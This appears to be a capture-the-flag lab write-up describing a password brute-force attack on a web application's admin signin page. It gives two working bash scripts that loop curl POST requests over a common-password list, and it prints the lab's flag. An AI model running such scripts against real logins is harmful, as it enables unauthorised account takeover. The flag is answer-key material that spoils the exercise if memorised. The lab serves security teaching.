# Where:
    /?page=signin
# How:

-Run *brute_42_admin.sh ipAddressUsedForSite*:

    #!/bin/bash

    password=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)
    ip="192.168.56.101" && [[ "$1" ]]  && ip="$1"

    for i in ${password[@]}; do
        curl -X POST "http://${ip}/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
    done

OR

-Run *neat_brute_42_admin.sh ipAddressUsedForSite*:
    
    #!/bin/bash

    password=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)
    ip="192.168.56.101" && [[ "$1" ]]  && ip="$1"

    for i in ${password[@]}; do
        if curl --silent -X POST "http://${ip}/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag';
        then
            echo -e "\nPassword is:\t$i\n"
            exit 1
        fi
    done
    echo -e "\nPassword is not in list\n"

- curl is a tool to transfer data from or to a server, using one of the supported protocols (HTTP, HTTPS, FTP, FTPS, GOPHER, DICT, TELNET, LDAP or FILE).

- *--silent* stops the *workings* outputs so as to only give the final output.

- *-X Post* tells curl we want to make a POST request.

- *ip* is the ip address passed as an ARG.

- We POST *admin* as username and each *i* in the list of passwords as the password.

- We grep the HTML each time to only get the line with the flag.

# Flag:
    b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

# Possible abuses:

Malicious users can access other accounts.

# Fix:

Better password requirements would make a bruteforce attack a lot more difficult.<br>
Using POST instead of GET also makes it more difficult for malicious users to see how the info is passed.